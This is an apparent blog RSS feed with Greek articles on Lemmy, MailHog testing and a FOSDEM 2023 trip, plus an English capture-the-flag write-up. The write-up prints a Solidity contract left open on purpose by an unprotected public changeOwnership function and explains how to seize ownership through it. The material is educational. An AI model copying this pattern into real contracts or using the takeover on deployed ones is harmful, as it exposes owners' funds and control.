<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DimitrisV SV1SJP</title><link>/</link><description>Recent content on DimitrisV SV1SJP</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>TuxHouse - Dimitris LinuxOS - 2011-2023</copyright><lastBuildDate>Wed, 28 Jun 2023 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Τέλος το Reddit; Καλώς Ορίσατε στο Lemmy</title><link>/greek_articles/lemmy/</link><pubDate>Wed, 28 Jun 2023 00:00:00 +0000</pubDate><guid>/greek_articles/lemmy/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.
Αφού αναφέραμε τι συμβαίνει με τους εκβιασμούς του Reddit σε moderators από όσα subreddits έγιναν private τις ημέρες τις διαμαρτυρίας, ήρθε η ώρα να αναφερθούμε στην επόμενη ημέρα.
Σήμερα 30/06/2023 είναι η τελευταία ημέρα που δουλεύουν μαζικά όλες οι third party εφαρμογές. Από 01/07/2023, οι χρήστες του Reddit θα πρέπει να κατεβάσουν είτε την επίσημη εφαρμογή του Reddit με τους γνωστούς της περιορισμούς, είτε να κάνουν compile χειροκίνητα με δικά τους API keys τις εφαρμογές που θέλουν να χρησιμοποιήσουν.</description><content>&lt;p>&lt;a href="https://linux-user.gr/t/telos-to-reddit-kalws-orisate-sto-lemmy/4988">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://linux-user.gr/uploads/default/optimized/2X/d/d433e17b9a0d3659dbc57015a23e1b57605c744d_2_690x454.jpeg" alt="">&lt;/p>
&lt;p>&lt;a href="https://linux-user.gr/t/to-reddit-kai-to-linux-user-gr/4985">Αφού αναφέραμε τι συμβαίνει με τους εκβιασμούς του Reddit σε moderators από όσα subreddits έγιναν private τις ημέρες τις διαμαρτυρίας&lt;/a>, ήρθε η ώρα να αναφερθούμε στην επόμενη ημέρα.&lt;/p>
&lt;p>Σήμερα 30/06/2023 είναι η τελευταία ημέρα που δουλεύουν μαζικά όλες οι third party εφαρμογές. Από 01/07/2023, οι χρήστες του Reddit θα πρέπει να κατεβάσουν είτε την επίσημη εφαρμογή του Reddit με τους γνωστούς της περιορισμούς, είτε να κάνουν compile χειροκίνητα με δικά τους API keys τις εφαρμογές που θέλουν να χρησιμοποιήσουν.&lt;/p>
&lt;h2 id="στα-σημαντικά-της-πληροφορίας">Στα σημαντικά της πληροφορίας:&lt;/h2>
&lt;p>Μέσα στα πλαίσια της διαμαρτυρίας, το Lemmy, ένα αποκεντρωμένο link aggregator που μοιάζει αρκετά με το Reddit και είναι συνδεδεμένο με το Mastodon στο Fediverse, απέκτησε μεγάλη φήμη. Γρήγορα, πάρα πολλά subreddits άρχισαν και μετακινόντουσαν εκεί ως νέα communities ενώ παράλληλα μετέφεραν μαζί και το περιεχόμενο τους. Το Linux-User.gr βρίσκεται μέσα σε αυτά, και δημιούργησε τον δικό του χώρο στην ομοσπονδία του Lemmy ως &lt;a href="https://lemmy.world/c/linuxuser_gr">&lt;strong>linuxuser_gr@lemmy.world&lt;/strong>&lt;/a> .&lt;/p>
&lt;p>Στα παρακάτω κεφάλαια θα παρουσιάσουμε συνοπτικά το Lemmy καθώς θα δούμε και πώς δουλεύει. Ο οδηγός στοχεύει για χρήση από το ευρύ Ελληνικό κοινό, συνεπώς θα αποφύγω να εμβαθύνω σε πολές λεπτομέρειες.&lt;/p>
&lt;h2 id="πώς-δουλεύει-το-lemmy">Πώς δουλεύει το Lemmy;&lt;/h2>
&lt;p>Το Lemmy αποτελείται πρακτικά από μία ομοσπονδία από servers (ή αλλιώς instances), οι οποίοι τρέχουν τις δικές τους εκδόσεις του Lemmy τοπικά (locally). Κάθε server έχει το δικό του όνομα (ενδεικτικά &lt;a href="https://lemmy.world">lemmy.world&lt;/a>, &lt;a href="https://sh.itjust.works">sh.itjust.works&lt;/a> , &lt;a href="https://feddit.de">feddit.de&lt;/a> , &lt;a href="https://lemm.ee">lemm.ee&lt;/a> , &lt;a href="https://programming.dev">programming.dev&lt;/a> , &lt;a href="https://social.fossware.space/">FOSSware&lt;/a> κ.α.) Κάθε server από αυτούς αποτελείται από τα δικά του μέλη, τις δικές του κοινότητες (communities), αλλά και τους δικούς του κανόνες.&lt;/p>
&lt;p>Μέχρι εδώ θα μπορούσε κανείς να πει ότι το concept μοιάζει σαν το &lt;a href="https://www.discourse.org/">Discourse&lt;/a>, το ανοικτού κώδικα δηλαδή φόρουμ που χρησιμοποιούμαι και στο Linux-User.gr .&lt;/p>
&lt;h2 id="η-ώρα-της-ομοσπονδίας">Η ώρα της Ομοσπονδίας:&lt;/h2>
&lt;p>Το Lemmy εκτός από αυτά που προαναφέρθηκαν, προσφέρει μία ακόμη σημαντικότατη πινελιά, που το κάνει απίστευτα σημαντικό. Την δημιουργία ομοσπονδιών.&lt;/p>
&lt;p>Δηλαδή, οι διάφοροι servers που τρέχουν τις δικές τους εκδόσεις του Lemmy, μπορούν αν το αποφασίσουν, να συνδεθούν μεταξύ τους, και έτσι με αυτό τον τρόπο, όλοι οι χρήστες εκείνων των συνδεδεμένων servers, να μπορούν να επικοινωνούν μεταξύ τους, να έχουν πρόσβαση στα communities ο ένας του άλλου κτλπ. Συνεπώς, κατασκευάζεται ένα δίκτυο με πάρα πολλά instances, οπού όλα επικοινωνούν μεταξύ τους (εφόσων το επιθυμούν οι διαχειριστές του κάθε Lemmy server).&lt;/p>
&lt;p>Ο κάθε Lemmy server administrator μπορεί να διαλέξει με ποιούς servers θέλει να συνδεθεί ως ομοσπονδία.&lt;/p>
&lt;h2 id="η-δομή-ενός-community">Η Δομή ενός Community:&lt;/h2>
&lt;p>&lt;code>Όνομα_Κοινότητας@Server_Οπού_Βρίσκεται &lt;/code>&lt;/p>
&lt;p>Και έτσι ώς παράδειγμα, το community: &lt;code>linuxuser_gr@lemmy.world&lt;/code> , καταλαβαίνουμε πώς βρίσκεται στον server &lt;a href="https://lemmy.world">lemmy.world&lt;/a>.&lt;/p>
&lt;p>Αντίστοιχα ισχυει και για τους χρήστες. Για παράδειγμα, εγώ είμαι ο &lt;a href="https://lemmy.world/u/sv1sjp">sv1sjp@lemmy.world&lt;/a> .
Η δομή των χρηστών είναι:
&lt;code>Όνομα_Χρήστη@Server_Οπού_Βρίσκεται &lt;/code>&lt;/p>
&lt;p>Το &lt;a href="https://lemmy.world">lemmy.world&lt;/a> αποτελεί τον μεγαλύτερο και διασημότερο generic Lemmy instance, με πάνω από 11 χιλιάδες χρήστες. Το lemmy.world είναι ενωμένο ως ομοσπονδία με τα περισσότερα δίκτυα Lemmy εκεί έξω, συνεπώς για να συμμετέχετε στο &lt;a href="mailto:linuxuser_gr@lemmy.world">linuxuser_gr@lemmy.world&lt;/a> , μπορείτε να δημιουργήσετε λογαριασμό σε όποιο instance σας αρέσει. Δεν έχει ιδιαίτερο νόημαη επιλογή ποιού από τα παραπάνω που ανάφερα δηλαδή, για να σας προβληματίζει. Όλοι επικοινωνούν με όλους! Μπορείτε επίσης να είστε και moderators από διαφορετικούς servers στο ίδιο community.&lt;/p>
&lt;p>Εδώ θα βρείτε την λίστα με όλα τα Lemmy instances που τρέχουν (γνωστά) αυτή την στιγμή. Όσα αναγράφουν &amp;ldquo;Yes&amp;rdquo; στο Fed, σημαίνει ότι είναι ενωμένα μεταξύ τους:&lt;/p>
&lt;p>&lt;a href="https://github.com/maltfield/awesome-lemmy-instances">https://github.com/maltfield/awesome-lemmy-instances&lt;/a>&lt;/p>
&lt;h3 id="δεν-μου-εμφανίζεται-το-linux-usergr-ή-κάποια-άλλη-κοινότητα-στο-lemmy-server-που-επέλεξα">Δεν μου εμφανίζεται το Linux-User.gr ή κάποια άλλη κοινότητα στο Lemmy server που επέλεξα;&lt;/h3>
&lt;p>Σε αυτό το σημείο πρέπει να ανφερθεί ότι παρόλο που οι servers είναι ενωμένοι, &lt;strong>δεν&lt;/strong> συγχρονίζουν αυτόματα &lt;strong>όλες&lt;/strong> τις κοινότητες, αν δεν υπάρξει η ζήτηση από &lt;strong>τουλάχιστον&lt;/strong> 1 άτομο του server.&lt;/p>
&lt;h3 id="και-πότε-συγχρονίζεται-μία-κοινότητα">Και πότε συγχρονίζεται μία κοινότητα;&lt;/h3>
&lt;p>Μία κοινότητα συγχρονίζεται όταν κάποιος χρήστης της για πρώτη φορά γράψει το &lt;code>community@server&lt;/code> (π.χ. &lt;a href="mailto:linuxuser_gr@lemmy.world">linuxuser_gr@lemmy.world&lt;/a>) στην αναζήτηση του Lemmy instance οπού βρίσκεται, είτε κάνει copy-paste το link του server μαζί με το link του community (π.χ. στην περίπτωση μας: &lt;a href="https://lemmy.world/c/linuxuser_gr)">https://lemmy.world/c/linuxuser_gr)&lt;/a>. Από εκεί και πέρα, μόλις ο χρήστης πατήσει subscribe, οι 2 σέρβερς αυτοί &lt;strong>αυτόματα&lt;/strong> θα συγχρονίζουν όλο το περιεχόμενο που βρίσκεται σε αυτή την κοινότητα. Τόσο απλά.&lt;/p>
&lt;h2 id="είναι-τόσο-δύσκολο-όσο-φάινεται">Είναι τόσο δύσκολο όσο φάινεται;&lt;/h2>
&lt;p>Το Lemmy παρόλο που υπάρχει από το 2019, πήρε απότομα δημοσιότητα με την διαμαρτυρία κατά του Reddit. Συνεπώς, το scalability παραμένει θέμα και μιας και πλέον υπάρχουν χιλιάδες χρήστες ενεργοί ταυτόχρονα, παρατηρούνται διάφορα bugs. Σε γενικές γραμμές όμως, όλα δουλεύουν μία χαρά, και το σίγουρο είναι ότι όσο μεγαλώνει η κοινότητα, τόσο περισσότερος κόσμος θα βοηθάει στο να επιλυθούν τα διάφορα bugs, μετάφραση σε διαφορετικές γλώσσες και φυσικά Android &amp;amp;&amp;amp; iOS εφαρμογές.
Επιπλέον αξίζει να επισημαθεί, ότι το Mastodon έχει κανονική επικοινωνία με το Lemmy μιας και τα 2 βρίσκονται στο Fediverse και συνεπώς μπορείτε να ψάξετε posts μέσα από αυτό.&lt;/p>
&lt;h2 id="faq">FAQ:&lt;/h2>
&lt;p>Αφού παρουσιάσαμε διάφορα βασικά χαρακτηριστικά του Lemmy, ας δούμε τώρα κάποιες συχνές ερωτήσεις/απαντήσεις για ευκολότερη μετάβαση.&lt;/p>
&lt;h3 id="χρειάζεται-να-φτιάξω-περισσότερο-από-έναν-λογαριασμό-στο-lemmy">Χρειάζεται να φτιάξω περισσότερο από έναν λογαριασμό στο Lemmy;&lt;/h3>
&lt;ul>
&lt;li>Όχι. Όσο τα communities που χρησιμοποείς βρίσκονται στην ίδια ομοσπονδία, ένας λογαριασμός επαρκεί για να επικοινωνείς με όλα.&lt;/li>
&lt;/ul>
&lt;h3 id="υπάρχουν-δηλαδή-και-ανεξάρτητα-lemmy-instances-που-δεν-αποτελούν-μέλος-της-ομοσπονδίας">Υπάρχουν δηλαδή και ανεξάρτητα Lemmy instances που δεν αποτελούν μέλος της ομοσπονδίας;&lt;/h3>
&lt;ul>
&lt;li>Ναι. Το &lt;a href="https://beehaw.org">beehaw.org&lt;/a> έκανε defederate λίγες ημέρες πριν σε προσπάθεια να μειώσει το spam και να χτίσει έναν ανεξάρτητο Lemmy instance με μεγαλύτερη ασφάλεια. Αντίθετα, ο server Exploding Heads, έγινε defederate από το lemmy.world, διότι οι administrators τους &lt;a href="https://lemmy.world/post/747912">κακοποιούσαν λεκτικά τυχαίους ανθρώπους στο διαδίκτυο.&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="μπορώ-να-σηκώσω-τον-δικό-μου-server-στο-lemmy-και-να-γίνω-ο-user-mhtsosiusearchbtw-">Μπορώ να σηκώσω τον δικό μου server στο Lemmy και να γίνω ο user &lt;a href="mailto:mhtsos@iusearch.btw">mhtsos@iusearch.btw&lt;/a> ?&lt;/h3>
&lt;ul>
&lt;li>Φυσικά. Μπορείς εύκολα με το docker image τους να σηκώσεις τον δικό σου σέρβερ και να γίνεις ομοσπονδία με τους σέρβερ που επιθυμείς εσύ.&lt;/li>
&lt;/ul>
&lt;h3 id="προτεινόμενη-android-εφαρμογή-για-lemmy">Προτεινόμενη Android εφαρμογή για Lemmy;&lt;/h3>
&lt;ul>
&lt;li>Για όσους servers τρέχουν 0.18 έκδοση του Lemmy, προτείνεται το &lt;a href="https://f-droid.org/packages/com.jerboa/">Jerboa for Lemmy&lt;/a> (διαθέσιμο και σε Google Play Store και σε F-Droid). Για servers που τρέχουν 0.17.4, θα χρειαστεί λίγη υπομονή ακόμα έτσι ώστε να αναβαθμιστούν :) .&lt;/li>
&lt;/ul>
&lt;h3 id="προτεινόμενη-εφαρμογή-για-ios">Προτεινόμενη εφαρμογή για iOS;&lt;/h3>
&lt;ul>
&lt;li>Προτείνεται η εφαρμογή: (SOON)&lt;/li>
&lt;/ul>
&lt;h3 id="υπάρχει-διαφορετικό-ui-ως-webapp-με-πιο-στυλ-iphone">Υπάρχει διαφορετικό UI ως webapp με πιο στυλ iPhone;&lt;/h3>
&lt;ul>
&lt;li>Φυσικά και δουλεύει με τα πάντα:
&lt;a href="https://wefwef.app">https://wefwef.app&lt;/a>
Μπορείτε να το κάνετε και selfhost στον server σας.&lt;/li>
&lt;/ul>
&lt;h3 id="άλλες-εφαρμογές-ακόμα-και-για-linux-συστήματα">Άλλες εφαρμογές, ακόμα και για LInux συστήματα;&lt;/h3>
&lt;ul>
&lt;li>Μπορείς να βρεις όλες τις διαθέσιμες εφαρμογές εδώ: &lt;a href="https://join-lemmy.org/apps">https://join-lemmy.org/apps&lt;/a>.&lt;/li>
&lt;/ul>
&lt;h3 id="μπορώ-να-φτιάξω-τις-δικές-μου-κοινότητες">Μπορώ να φτιάξω τις δικές μου κοινότητες;&lt;/h3>
&lt;ul>
&lt;li>Ναι αν το επιτρέπει ο server που γράφτηκες. Π.χ, ο lemmy.ml δεν επιτρέπει δημιουργία κοινοτήτων αυτή την περίοδο.&lt;/li>
&lt;/ul>
&lt;h3 id="μπορώ-να-φτιάξω-λογαριασμό-στο-lemmy-χωρίς-email">Μπορώ να φτιάξω λογαριασμό στο Lemmy χωρίς email?&lt;/h3>
&lt;ul>
&lt;li>Ναι, αν το επιτρέπει ο server που γράφτηκες.&lt;/li>
&lt;/ul>
&lt;h2 id="τα-δικαιώματα-αυτού-του-άρθρου">Τα Δικαιώματα αυτού του Άρθρου:&lt;/h2>
&lt;p>Με στόχο την διάδοση του Lemmy, το άθρρο αυτό επιτρέπεται να δημοσιευτει στην ιστοσελίδα σας αυτούσιο, με την μόνη υποχρέωσή σας να εμφανίζομαι ως συντάκτης αλλά και το Linux-User.gr ως η πηγή για το άρθρο.&lt;/p>
&lt;p>Σας περιμένουμε στο Lemmy!!!
&lt;strong>Στα σχόλια μπορείτε να προσθέσετε ενδιαφέροντα Rooms του Lemmy ακόμα και να μην έχουν να κάνουν απαραίτητα με Πληροφορίκη.&lt;/strong>&lt;/p>
&lt;p>&lt;img src="https://linux-user.gr/uploads/default/optimized/2X/a/a12bb9fcb6ce98fc67eef6e5d8729525f79269f1_2_248x500.jpeg" alt="">&lt;/p>
&lt;h2 id="extra-info">Extra Info&lt;/h2>
&lt;p>Αν δεν υπάρχει στόχος να δημιουργηθούν νέες κοινότητες, τότε συμφέρει να δημιουργούμε λογαριασμούς σε μικρότερα/διαφορετικά instances ώστε να είναι πιο balanced ο φόρτος εργασίας.&lt;/p>
&lt;p>Από όλα τα instances οπού είναι σε ομοσπονδία, βλέπετε όλοι το ίδιο υλικό.
Το Lemmy.world πήγε από 11.000 χρήστες στους 70.000+ σε 14 ώρες περίπου. Κλάταρε από το traffic.&lt;/p>
&lt;p>Όλα τα instances που αναφέρω στο άρθρο είναι δοκιμασμένα, δουλεύουν σωστά και τα υποστηρίζουν αξιόλογοι άνθρωποι ή εταιρείες (π.χ. το Ubuntu μετανάστευσε στο FOSSwave.&lt;/p>
&lt;p>Σε άλλα νέα, μόλις έκανα τις τελικές αλλαγές στην Ελληνική Μετάφραση στο Jerboa (Android app for Lemmy), και επίσημα έχουμε και Ελληνικά από την επόμενη έκδοση της εφαρμογής.&lt;/p></content></item><item><title>Self-Hosted SMTP Server για δοκιμές με emails</title><link>/greek_articles/mailhog/</link><pubDate>Fri, 28 Apr 2023 00:00:00 +0000</pubDate><guid>/greek_articles/mailhog/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.
Στην προσπάθεια μου να διοργανώσω ένα Security Awareness Campaign, χρειάστηκα να δοκιμάσω αποστολές μαζικών email σε ένα λογισμικό που φτιάξαμε.
Το θέμα είναι ότι αφού προσωπικά το χρειαζόμουν για να το δοκιμάσω τοπικά, πριν γίνει deploy εκεί οπού έπρεπε, ήθελα να δοκιμάσω ότι η υποδομή λειτουργεί και στέλνει κανονικά email.
Και εκεί βρήκα το Mailhog το οποίο μου έλυσε τα χέρια.</description><content>&lt;p>&lt;a href="https://linux-user.gr/t/self-hosted-smtp-server-gia-dokimes-me-emails/4920/5">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>&lt;/p>
&lt;p>Στην προσπάθεια μου να διοργανώσω ένα Security Awareness Campaign, χρειάστηκα να δοκιμάσω αποστολές μαζικών email σε ένα λογισμικό που φτιάξαμε.&lt;/p>
&lt;p>Το θέμα είναι ότι αφού προσωπικά το χρειαζόμουν για να το δοκιμάσω τοπικά, πριν γίνει deploy εκεί οπού έπρεπε, ήθελα να δοκιμάσω ότι η υποδομή λειτουργεί και στέλνει κανονικά email.&lt;/p>
&lt;p>Και εκεί βρήκα το &lt;a href="https://github.com/mailhog/MailHog">Mailhog&lt;/a> το οποίο μου έλυσε τα χέρια.&lt;/p>
&lt;p>Το MaiHog τρέχει σε Go και είναι εξαιρετικά απλό στην χρήση ώστε να έχουμε έναν basic smtp server για δοκιμαστικούς σκοπούς στο σύστημα μας, ο οποίος μπορεί να λάβει emails από άλλες εφαρμογές.&lt;/p>
&lt;h2 id="deploy-μέσω-docker">Deploy μέσω Docker:&lt;/h2>
&lt;p>Πολύ εύκολα και απλά δίνουμε σε ένα τερματικό:&lt;/p>
&lt;pre tabindex="0">&lt;code>docker run -d --name mailhog -p 1025:1025 -p 8025:8025 mailhog/mailhog
&lt;/code>&lt;/pre>&lt;p>Και είμαστε έτοιμοι!! :slight_smile:&lt;/p>
&lt;h2 id="web-client">Web Client&lt;/h2>
&lt;p>Στην πόρτα 8025 μπορούμε να βρούμε ένα βασικό mail client ώστε να λαμβάνουμε τα τοπικά mail οπού στέλνονται:&lt;/p>
&lt;p>&lt;img src="https://linux-user.gr/uploads/default/original/2X/c/cbb5d6389561223a2a1f3df23a31857bf6674845.png" alt="image|690x407">&lt;/p>
&lt;h2 id="πώς-στέλνουμε-emails">Πώς στέλνουμε emails;&lt;/h2>
&lt;p>Το MailHog θα εμφανίζει οποιοδήποτε mail (ανεξαρτήτου domain name - &lt;a href="mailto:dimitris@linux.gr">dimitris@linux.gr&lt;/a>, &lt;a href="mailto:michaeljackson@greece.eu">michaeljackson@greece.eu&lt;/a> , &lt;a href="mailto:fosscomm@earth.gov">fosscomm@earth.gov&lt;/a>) σταλθεί με &amp;ldquo;στόχο&amp;rdquo; την ΙΡ και πόρτα 1025 (π.χ. localhost:1025)&lt;/p>
&lt;p>Σε αυτό το σημείο αξίζει να επισημανθεί ξανά πως η λογική του MailHog είναι καθαρά για development για δοκιμή αποστολής email και όχι για πραγματική χρήση σε περιβάλλοντα παραγωγής.&lt;/p></content></item><item><title>War Of Array</title><link>/blockchain_writeups/warofarray/</link><pubDate>Sat, 04 Mar 2023 00:00:00 +0000</pubDate><guid>/blockchain_writeups/warofarray/</guid><description>On this challenge, we have the smart-contract WarOfArray and we are requested to claim the ownership of the contract, and then add 2 numbers on the &amp;ldquo;myArray&amp;rdquo; array. Using Remix IDE from remix.ethereum.org is recommended on this challenge.
// SPDX-License-Identifier: GPL-3.0-or-later pragma solidity 0.8.18; contract WarOfArray { uint[] public myArray; address public owner; constructor() { owner = address(0x1234567890123456789012345678901234567890); } function addToMyArray(uint _value) public { require(msg.sender == owner, &amp;#34;Only the contract owner can add to the array&amp;#34;); myArray.</description><content>&lt;p>On this challenge, we have the smart-contract WarOfArray and we are requested to claim the ownership of the contract, and then add 2 numbers on the &amp;ldquo;myArray&amp;rdquo; array.
Using Remix IDE from remix.ethereum.org is recommended on this challenge.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.18;
contract WarOfArray {
uint[] public myArray;
address public owner;
constructor() {
owner = address(0x1234567890123456789012345678901234567890);
}
function addToMyArray(uint _value) public {
require(msg.sender == owner, &amp;#34;Only the contract owner can add to the array&amp;#34;);
myArray.push(_value);
}
function isOwner() public view returns (bool) {
return (msg.sender == owner);
}
function hasTwoElements() public view returns (bool) {
require(msg.sender == owner, &amp;#34;Only the contract owner can check the array length&amp;#34;);
return (myArray.length &amp;gt;= 2);
}
function changeOwnership(address newOwner) public {
owner = newOwner;
}
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;h3 id="how-to-deploy-warofarray">How to deploy WarOfArray?&lt;/h3>
&lt;p>Paste this smart-contract as a new contract to Remix IDE with the name WarOfArray. Then, on the third tab, click compile and then, in the fourth tab, click deploy in any testnet or directly via browser.&lt;/p>
&lt;p>Remix, is the official online IDE provided by Ethereum.org and it is used to create and deploy Ethereum smart contracts using Solidity programming language. It is one of the tools that helped us to deploy our attacks to other smart-contracts or to call contract functions. It has several built-in Solidity compiler versions andit runs through the web browser. Furthermore, it is used to provide a connection with Web3.js to interact with wallets like Metamask in Ethereum Mainet or Testnets.&lt;/p>
&lt;hr>
&lt;p>First of all, let&amp;rsquo;s talk about the constructor. Constructor is an optional function and is used to initialize state variables of a contract. State variables are variables whose values are permanently stored in smart-contract&amp;rsquo;s storage. We have to mention here that each contract can have only one constructor. A constructor code is executed once when a contract is created and it is used to initialize contract state. After a constructor code executed, the final code is deployed to blockchain.
On this smart-contract, constructor sets a specific address as the owner of this smart-contract.
Furthermore, we can see an array and some functions. However, in order to call them. being the owner is required. But not all of those.&lt;/p>
&lt;p>Unfortunately, the developer of this smart-contract created by mistake a function changeOwnership(address), which as it is public, everyone can call it and then gain ownership. Using Remix IDE, we can very easily, copy our wallet&amp;rsquo;s public address and then paste it on the changeOwnership() field and then press the button.&lt;/p>
&lt;p>Then, we call the function isOwner() by clicking the button from Remix, and this time, it returns &amp;ldquo;TRUE&amp;rdquo;. Now we own this smart-contract.&lt;/p>
&lt;p>As we own the smart-contract right now, we can call any function which requires ownership (msg.sender == owner). So all we have to do now is just add 2 numbers on the array by calling the function &amp;ldquo;addToArray()&amp;rdquo;.&lt;/p>
&lt;p>Then, we call the function &amp;ldquo;hasTwoElements(): and it returns &amp;ldquo;TRUE&amp;rdquo; and we have successfully finished the challenge.&lt;/p>
&lt;p>This challenge was a pretty easy one, however it is a nice motivation to try to use Remix IDE to audit and exploit vulnerabilites in smart-contracts.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>To Linux-User.gr στην FOSDEM 2023 στις Βρυξέλλες</title><link>/greek_articles/fossdem2023/</link><pubDate>Mon, 13 Feb 2023 00:00:00 +0000</pubDate><guid>/greek_articles/fossdem2023/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.
To Linux-User.gr στην FOSDEM 2023 στις Βρυξέλλες, Bέλγιο Η FOSDEM αποτελεί το ετήσιο πανευρωπαϊκό συνέδριο ανοικτού λογισμικού που διοργανώνεται από το University libre de Bruxelles (UBL). Backstory: Μετά το ταξίδι μας στο Πανεπιστήμιο Θεσσαλίας για την FOSSCOMM2022, ο @kgiannakis είχε την ιδεά να παρεβρεθούμε στην FOSDEM 2023 έτσι ώστε να εξερευνήσουμε το Βέλγιο, αλλά και το πιο διάσημο πανευρωπαικό συνέδριο ανοικτού λογισμικού που θα πραγματοποιούταν για 23ο χρόνο.</description><content>&lt;p>&lt;a href="https://linux-user.gr/t/self-hosted-smtp-server-gia-dokimes-me-emails/4920/5">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>&lt;/p>
&lt;h1 id="to-linux-usergr-στην-fosdem-2023-στις-βρυξέλλες-bέλγιο">To Linux-User.gr στην FOSDEM 2023 στις Βρυξέλλες, Bέλγιο&lt;/h1>
&lt;p>&lt;img src="upload://5xqp4hPmlL04xLKC7J0OetPTHY4.jpeg" alt="Screenshot_20230208-231629_Gallery|377x500, 75%">&lt;/p>
&lt;p>Η FOSDEM αποτελεί το ετήσιο πανευρωπαϊκό συνέδριο ανοικτού λογισμικού που διοργανώνεται από το University libre de Bruxelles (UBL).
&lt;img src="upload://hOEhot6zSFtLjcBNMyRiNAqGKtQ.png" alt="FOSDEM_logo|496x500, 50%">&lt;/p>
&lt;h3 id="backstory">Backstory:&lt;/h3>
&lt;p>Μετά το ταξίδι μας στο Πανεπιστήμιο Θεσσαλίας για την FOSSCOMM2022, ο @kgiannakis είχε την ιδεά να παρεβρεθούμε στην FOSDEM 2023 έτσι ώστε να εξερευνήσουμε το Βέλγιο, αλλά και το πιο διάσημο πανευρωπαικό συνέδριο ανοικτού λογισμικού που θα πραγματοποιούταν για 23ο χρόνο.&lt;/p>
&lt;p>Έτσι λοιπόν, Τετάρτη 1 Φεβρουαρίου επιβιβαζόμαστε στο αεροπλάνο από Αθήνα για Σαρλερουά, προσγειωνόμαστε στο Βέλγιο. Έπειτα, ακολούθησε εξερεύνηση σε Βρυξέλλες και Βρύγη για 2 ημέρες. Την τρίτη ημέρα λοιπόν, επισκεπτόμαστε το Ελεύθερο Πανεπιστήμιο των Βρυξελλών, γεμάτοι ενθουσιασμό, για τα γεγονότα οπού θα ακολουθήσουν.&lt;/p>
&lt;h3 id="ήρθε-η-ώρα-της-fosdem">Ήρθε η ώρα της FOSDEM:&lt;/h3>
&lt;p>&lt;img src="upload://pi9sqbQl6qj4TGWpyuZ7WHaBcFv.jpeg" alt="Screenshot_20230208-231740_Gallery|405x500, 100%">&lt;/p>
&lt;p>Το συνέδριο της FOSDEM 2023 ήταν πραγματικά τεράστιο! Πραγματοποιήθηκε το Σαββατοκύριακο στις 4 και 5 Φεβρουαρίου 2023. 6 ολόκληρα κτήρια στέγαζαν την φετινή FOSDEM. Δεκάδες αμφιθέατρα υπέρ-πλήρης με χιλιάδες άτομα, άπειρα stands από διάφορες εταιρείες. Όλοι ήταν εκεί!!&lt;/p>
&lt;p>Πρώτα επισκεπτήκαμε το κτήριο &amp;ldquo;J&amp;rdquo;, στο οποίο υπήρχαν τα stands όπως αυτά του Ubuntu, του Fedora, αλλά και του OpenSUSE, το οποίο μάλιστα πρόσφερε και δικό του brand μπύρας.
&lt;img src="upload://bzKrWMH8ebibo8S0wyBiTAofMmS.jpeg" alt="Screenshot_20230208-231903_Gallery|491x500">&lt;/p>
&lt;p>Λίγο πιο δίπλα, βρισκόταν και το τραπεζάκι του AlmaLinux καθώς και το CentOS, οπού μοίραζε σκουφάκια και ποτήρια για καφέ.
&lt;img src="upload://8QoLZTV91gWBubMyKzG9ZFnP6kG.jpeg" alt="signal-2023-02-08-14-11-06-026-6|666x500">&lt;/p>
&lt;p>Προσωπικά, χρησιμοποίησα το σκουφάκι αυτό για να αποθηκεύσω τα εκατοντάδες αυτοκόλλητα που κυκλοφορούσαν από διάφορες εταιρείες και Projects στην FOSDEM, ήταν κάτι παραπάνω από χρήσιμος ομολογώ!&lt;/p>
&lt;p>Επιπλέον, δεν μπορεί να μην αναφερθεί το stand του Gentoo Linux (ναι, αυτής της διανομής GNU/Linux που κάνεις compile τα πάντα μόνος σου), οπού για να πάρεις το αυτοκόλλητο τους, έπρεπε να πάρεις το ψαλίδι και κυριολεκτικά να κόψεις 1 αυτοκόλλητο μόνος σου. Μάλιστα, αν ήθελες να φτιάξεις και κοκάνδρα, υπήρχε αναλυτικός οδηγός για το πώς να το φτιάξεις μόνος σου&amp;hellip;και φυσικά και τα αντίστοιχα εργαλεία οπού θα έπρεπε να χρησιμοποιήσεις. Τo stand του Gentoo πρόσφερε όλα τα εργαλεία που ήταν απαραίτητο για να επιτευχθεί αυτό!!
